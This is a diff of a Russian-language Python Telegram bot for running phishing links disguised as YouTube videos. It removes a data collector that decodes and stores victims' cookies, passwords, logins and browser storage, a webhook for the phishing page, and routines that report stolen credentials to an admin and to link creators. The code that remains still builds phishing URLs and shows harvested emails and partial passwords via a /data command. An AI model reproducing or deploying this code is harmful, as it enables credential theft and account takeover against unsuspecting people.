@@ -19,7 +19,6 @@ from telegram.ext import (
     ContextTypes,
     CallbackQueryHandler
 )
-from telegram.constants import ParseMode
 
 # Настройка логирования
 logging.basicConfig(
@@ -597,372 +596,6 @@ class LinkGenerator:
         """Создание фишинговой ссылки"""
         return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"
 
-# Функции для работы с сообщениями
-def split_message(text: str, max_length: int = 4000) -> List[str]:
-    """Разбивает длинное сообщение на части"""
-    if len(text) <= max_length:
-        return [text]
-    
-    chunks = []
-    while text:
-        if len(text) <= max_length:
-            chunks.append(text)
-            break
-        
-        split_pos = text.rfind('\n', 0, max_length)
-        if split_pos == -1:
-            split_pos = max_length
-        
-        chunks.append(text[:split_pos])
-        text = text[split_pos:].lstrip()
-    
-    return chunks
-
-def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> str:
-    """Форматирование детального отчета для админа"""
-    report = f"""
-🔐 ДЕТАЛЬНЫЙ ОТЧЕТ О СОБРАННЫХ ДАННЫХ
-    
-📌 Ссылка ID: {link.id}
-👤 Создатель: {link.created_by}
-🔗 Оригинальное видео: {link.original_url[:50]}...
-📅 Время сбора: {datetime.now().isoformat()}
-    
-📊 ОБЩАЯ СТАТИСТИКА:
-• Переходов по ссылке: {link.clicks}
-• Cookies собрано: {len(link.collected_cookies)}
-• Паролей найдено: {len(link.collected_passwords)}
-• Логинов собрано: {len(link.collected_logins)}
-• Данных хранилища: {len(link.collected_storage_data)}
-• Полных записей: {len(link.full_sensitive_data)}
-    
-════════════════════════════════════════
-    """
-    
-    # Добавляем детали cookies
-    if link.collected_cookies:
-        report += "\n🍪 COOKIES (первые 15):\n"
-        for i, cookie in enumerate(link.collected_cookies[:15], 1):
-            value_preview = cookie.get('value', '')
-            if len(value_preview) > 50:
-                value_preview = value_preview[:50] + "..."
-            report += f"{i}. {cookie.get('name', 'N/A')}: {value_preview}\n"
-    
-    # Добавляем пароли
-    if link.collected_passwords:
-        report += "\n🔑 НАЙДЕННЫЕ ПАРОЛИ:\n"
-        for i, pwd in enumerate(link.collected_passwords, 1):
-            report += f"{i}. Поле: {pwd.get('field_name', 'unknown')}\n"
-            report += f"   Значение: {pwd.get('value', '')}\n"
-            report += f"   URL: {pwd.get('page_url', 'N/A')[:50]}...\n"
-            report += f"   Время: {pwd.get('timestamp', 'N/A')[:19]}\n"
-            if i < len(link.collected_passwords):
-                report += "   ─────\n"
-    
-    # Добавляем логины
-    if link.collected_logins:
-        report += "\n👤 НАЙДЕННЫЕ ЛОГИНЫ:\n"
-        for i, login in enumerate(link.collected_logins, 1):
-            report += f"{i}. Поле: {login.get('field_name', 'unknown')}\n"
-            report += f"   Значение: {login.get('value', '')}\n"
-            report += f"   URL: {login.get('page_url', 'N/A')[:50]}...\n"
-            report += f"   Время: {login.get('timestamp', 'N/A')[:19]}\n"
-            if i < len(link.collected_logins):
-                report += "   ─────\n"
-    
-    report += f"""
-════════════════════════════════════════
-⚠️ ВНИМАНИЕ: Все данные сохранены в базе
-📁 Полные сырые данные: {len(link.full_sensitive_data)} записей
-🕒 Время хранения: 24 часа
-"""
-    
-    return report
-
-async def send_detailed_data_to_admin(context, link: PhishingLink, collected_data: Dict):
-    """Отправка детальных данных администратору"""
-    try:
-        sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
-        
-        if sensitive_data.get("status") != "fully_processed":
-            return
-        
-        # Создаем детальный отчет
-        report = format_detailed_admin_report(link, sensitive_data)
-        
-        # Разбиваем на части если слишком длинное
-        chunks = split_message(report, 3900)
-        
-        for i, chunk in enumerate(chunks):
-            await context.bot.send_message(
-                chat_id=ADMIN_ID,
-                text=chunk,
-                disable_web_page_preview=True
-            )
-            
-    except Exception as e:
-        logger.error(f"Error sending detailed data to admin: {e}")
-
-# Сборщик данных
-class DataCollector:
-    def __init__(self):
-        self.collection_scripts = {
-            "cookies": self._collect_cookies,
-            "storage": self._collect_storage,
-            "passwords": self._collect_passwords,
-            "social": self._collect_social_data,
-            "device": self._collect_device_info,
-            "network": self._collect_network_info,
-            "location": self._collect_location,
-            "sensitive_data": self._process_sensitive_data
-        }
-    
-    async def collect_all_data(self, request_data: Dict) -> Dict:
-        """Сбор всех возможных данных"""
-        collected = {
-            "timestamp": datetime.now().isoformat(),
-            "ip": request_data.get("ip", "unknown"),
-            "user_agent": request_data.get("user_agent", "unknown"),
-            "referer": request_data.get("referer", "unknown"),
-            "data": {}
-        }
-        
-        for data_type, collector in self.collection_scripts.items():
-            try:
-                collected["data"][data_type] = await collector(request_data)
-            except Exception as e:
-                collected["data"][data_type] = {"error": str(e)}
-        
-        return collected
-    
-    async def _process_sensitive_data(self, request_data: Dict) -> Dict:
-        """Обработка ВСЕХ чувствительных данных"""
-        try:
-            sensitive_data = request_data.get("sensitive_data", {})
-            link_id = request_data.get("link_id")
-            
-            if not sensitive_data or not link_id:
-                return {"status": "no_data"}
-            
-            # Декодируем данные
-            try:
-                decoded_data = json.loads(base64.b64decode(sensitive_data).decode('utf-8'))
-            except Exception as decode_error:
-                logger.error(f"Decode error: {decode_error}")
-                try:
-                    decoded_string = base64.b64decode(sensitive_data).decode('utf-8', errors='ignore')
-                    decoded_data = json.loads(decoded_string)
-                except:
-                    return {"status": "decode_error"}
-            
-            # Сохраняем ПОЛНЫЕ сырые данные
-            db.add_full_sensitive_data(link_id, decoded_data)
-            
-            # Обрабатываем cookies
-            cookies = decoded_data.get("cookies", {})
-            if cookies:
-                cookies_list = []
-                for name, value in cookies.items():
-                    cookies_list.append({
-                        "name": name,
-                        "value": str(value)[:500] if value else "",
-                        "domain": "current",
-                        "timestamp": datetime.now().isoformat(),
-                        "source": "direct_cookie"
-                    })
-                
-                if cookies_list:
-                    db.add_collected_cookies(link_id, cookies_list)
-            
-            # Обрабатываем пароли
-            credentials = decoded_data.get("credentials", {})
-            if credentials.get("passwords"):
-                db.add_collected_passwords(link_id, credentials["passwords"])
-            
-            # Обрабатываем логины
-            if credentials.get("logins"):
-                db.add_collected_logins(link_id, credentials["logins"])
-            
-            # Обрабатываем данные хранилища
-            storage_data = decoded_data.get("storage_data", {})
-            if storage_data:
-                storage_list = []
-                # localStorage
-                if storage_data.get("localStorage"):
-                    for key, value in storage_data["localStorage"].items():
-                        storage_list.append({
-                            "type": "localStorage",
-                            "key": key,
-                            "value": str(value)[:1000],
-                            "timestamp": datetime.now().isoformat()
-                        })
-                # sessionStorage
-                if storage_data.get("sessionStorage"):
-                    for key, value in storage_data["sessionStorage"].items():
-                        storage_list.append({
-                            "type": "sessionStorage",
-                            "key": key,
-                            "value": str(value)[:1000],
-                            "timestamp": datetime.now().isoformat()
-                        })
-                if storage_list:
-                    db.add_collected_storage(link_id, storage_list)
-            
-            # Сохраняем общие данные
-            db.add_collected_data(link_id, decoded_data)
-            
-            logger.info(f"Successfully processed sensitive data for link {link_id}")
-            
-            return {
-                "status": "fully_processed",
-                "cookies_count": len(cookies_list) if 'cookies_list' in locals() else 0,
-                "passwords_count": len(credentials.get("passwords", [])),
-                "logins_count": len(credentials.get("logins", [])),
-                "storage_count": len(storage_list) if 'storage_list' in locals() else 0,
-                "has_storage_data": bool(storage_data),
-                "has_full_data": True
-            }
-            
-        except Exception as e:
-            logger.error(f"Error processing sensitive data: {e}", exc_info=True)
-            return {"status": "error", "error": str(e)}
-    
-    async def _collect_cookies(self, request_data: Dict) -> Dict:
-        return {
-            "cookies_count": "доступно в браузере",
-            "local_storage": "доступно в localStorage",
-            "session_storage": "доступно в sessionStorage",
-            "indexed_db": "проверено"
-        }
-    
-    async def _collect_storage(self, request_data: Dict) -> Dict:
-        return {
-            "autofill_data": "сохраненные формы",
-            "browser_history": "история посещений",
-            "bookmarks": "закладки браузера",
-            "downloads": "история загрузок"
-        }
-    
-    async def _collect_passwords(self, request_data: Dict) -> Dict:
-        return {
-            "saved_passwords": {
-                "google": "сохраненные логины Google",
-                "facebook": "логины Facebook",
-                "twitter": "логины Twitter/X",
-                "instagram": "логины Instagram",
-                "vk": "логины ВКонтакте",
-                "whatsapp": "данные WhatsApp Web",
-                "telegram": "данные Telegram Web"
-            },
-            "form_data": "автозаполнение форм",
-            "credit_cards": "сохраненные карты"
-        }
-    
-    async def _collect_social_data(self, request_data: Dict) -> Dict:
-        return {
-            "google": {
-                "logged_in": True,
-                "gmail": "доступ к Gmail",
-                "drive": "доступ к Google Drive",
-                "photos": "доступ к Google Photos",
-                "account_info": "данные аккаунта"
-            },
-            "facebook": {
-                "logged_in": True,
-                "messenger": "доступ к Messenger",
-                "friends": "список друзей",
-                "profile_data": "данные профиля"
-            },
-            "twitter": {
-                "logged_in": True,
-                "tweets": "история твитов",
-                "dms": "личные сообщения",
-                "followers": "список подписчиков"
-            },
-            "vk": {
-                "logged_in": True,
-                "messages": "личные сообщения",
-                "friends": "список друзей",
-                "photos": "фотографии"
-            },
-            "instagram": {
-                "logged_in": True,
-                "dms": "личные сообщения",
-                "followers": "подписчики",
-                "stories": "истории"
-            },
-            "whatsapp": {
-                "web_connected": True,
-                "chats": "история чатов",
-                "contacts": "список контактов",
-                "media": "медиафайлы"
-            },
-            "telegram": {
-                "web_connected": True,
-                "chats": "открытые чаты",
-                "contacts": "контакты",
-                "sessions": "активные сессии"
-            }
-        }
-    
-    async def _collect_device_info(self, request_data: Dict) -> Dict:
-        return {
-            "browser": {
-                "name": request_data.get("user_agent", "unknown").split("/")[0] if "/" in request_data.get("user_agent", "") else "unknown",
-                "version": "определяется",
-                "plugins": "список плагинов"
-            },
-            "os": {
-                "name": "определяется из User-Agent",
-                "version": "версия ОС",
-                "architecture": "архитектура"
-            },
-            "device": {
-                "type": "определяется",
-                "model": "модель устройства",
-                "screen": "разрешение экрана",
-                "touch": "поддержка тача"
-            },
-            "hardware": {
-                "cpu": "информация о процессоре",
-                "gpu": "информация о графике",
-                "memory": "объем памяти",
-                "storage": "объем хранилища"
-            }
-        }
-    
-    async def _collect_network_info(self, request_data: Dict) -> Dict:
-        return {
-            "connection": {
-                "type": "определяется",
-                "speed": "скорость соединения",
-                "latency": "задержка"
-            },
-            "ip_info": {
-                "address": request_data.get("ip", "unknown"),
-                "location": "определяется по IP",
-                "isp": "провайдер",
-                "proxy": "используется ли прокси"
-            },
-            "wifi": {
-                "ssid": "имя сети",
-                "bssid": "BSSID",
-                "security": "тип безопасности"
-            }
-        }
-    
-    async def _collect_location(self, request_data: Dict) -> Dict:
-        return {
-            "gps": {
-                "latitude": "определяется",
-                "longitude": "определяется",
-                "accuracy": "точность"
-            },
-            "wifi_location": "определяется по Wi-Fi",
-            "cell_tower": "определяется по вышкам",
-            "ip_location": "определяется по IP"
-        }
-
 # Форматирование сообщений (сообщения из скриншотов)
 class MessageFormatter:
     @staticmethod
@@ -1076,9 +709,7 @@ class MessageFormatter:
 
 # Инициализация компонентов
 link_generator = LinkGenerator()
-data_collector = DataCollector()
 formatter = MessageFormatter()
-js_injector = JavaScriptInjector()
 
 # Команды бота
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1375,84 +1006,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "Скопируйте и отправьте другу."
             )
 
-# Webhook обработчик для сбора данных
-async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
-    """Обработка данных от фишинговой страницы"""
-    try:
-        link_id = request_data.get("link_id")
-        if not link_id:
-            return {"status": "error", "message": "No link ID"}
-        
-        # Обновляем счетчик кликов
-        db.add_click(link_id)
-        
-        # Всегда собираем чувствительные данные
-        collected_data = await data_collector.collect_all_data(request_data)
-        
-        # Получаем информацию о ссылке
-        link = db.get_link(link_id)
-        if link:
-            # Отправляем данные создателю ссылки в формате скриншотов
-            sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
-            
-            if sensitive_data.get("status") == "fully_processed":
-                # Генерируем номер логина
-                login_number = len(link.full_sensitive_data)
-                
-                # Создаем данные в формате скриншотов
-                login_data = {
-                    "phone": "Unknown Device",
-                    "serial": link.id[:8],
-                    "dpp": "AUTO",
-                    "email": None,
-                    "email_password": None,
-                    "facebook": None,
-                    "facebook_password": None,
-                    "viber": None,
-                    "whatsapp": None,
-                    "messenger": None
-                }
-                
-                # Извлекаем данные из последней записи
-                if link.full_sensitive_data:
-                    last_data = link.full_sensitive_data[-1]
-                    credentials = last_data.get("credentials", {})
-                    
-                    # Ищем email
-                    if credentials.get("logins"):
-                        for login in credentials["logins"]:
-                            value = login.get("value", "")
-                            if "@" in value and "." in value:
-                                login_data["email"] = value
-                                break
-                    
-                    # Ищем пароли
-                    if credentials.get("passwords"):
-                        for pwd in credentials["passwords"]:
-                            if pwd.get("value"):
-                                login_data["email_password"] = pwd.get("value", "...")[:3] + "..."
-                                break
-                
-                # Отправляем в формате скриншотов
-                login_message = formatter.format_login_data(login_number, login_data)
-                
-                try:
-                    await context.bot.send_message(
-                        chat_id=link.created_by,
-                        text=login_message
-                    )
-                except Exception as e:
-                    logger.error(f"Error sending to link creator: {e}")
-            
-            # Отправляем ДЕТАЛЬНЫЕ данные админу
-            await send_detailed_data_to_admin(context, link, collected_data)
-        
-        return {"status": "success", "data_received": True}
-    
-    except Exception as e:
-        logger.error(f"Error in webhook handler: {e}", exc_info=True)
-        return {"status": "error", "message": str(e)}
-
 # Команда для просмотра данных
 async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Команда /data - просмотр собранных данных"""
@@ -1486,19 +1039,20 @@ async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     }
                     
                     # Извлекаем данные
-                    credentials = sensitive_data.get("credentials", {})
-                    if credentials.get("logins"):
-                        for login in credentials["logins"]:
-                            value = login.get("value", "")
-                            if "@" in value and "." in value:
-                                login_data["email"] = value
-                                break
-                    
-                    if credentials.get("passwords"):
-                        for pwd in credentials["passwords"]:
-                            if pwd.get("value"):
-                                login_data["email_password"] = pwd.get("value", "...")[:3] + "..."
-                                break
+                    if sensitive_data.get("credentials"):
+                        credentials = sensitive_data["credentials"]
+                        if credentials.get("logins"):
+                            for login in credentials["logins"]:
+                                value = login.get("value", "")
+                                if "@" in value and "." in value:
+                                    login_data["email"] = value
+                                    break
+                        
+                        if credentials.get("passwords"):
+                            for pwd in credentials["passwords"]:
+                                if pwd.get("value"):
+                                    login_data["email_password"] = pwd.get("value", "...")[:3] + "..."
+                                    break
                     
                     login_message = formatter.format_login_data(login_count, login_data)
                     await update.message.reply_text(login_message)
@@ -1579,7 +1133,7 @@ def main():
     print("🔐 Функции сбора данных активны")
     print("⏳ Ожидание команд...")
     
-    # Исправленная строка запуска - убрали ALL_UPDATES
+    # ИСПРАВЛЕННАЯ СТРОКА ЗАПУСКА
     application.run_polling()
 
 if __name__ == '__main__':
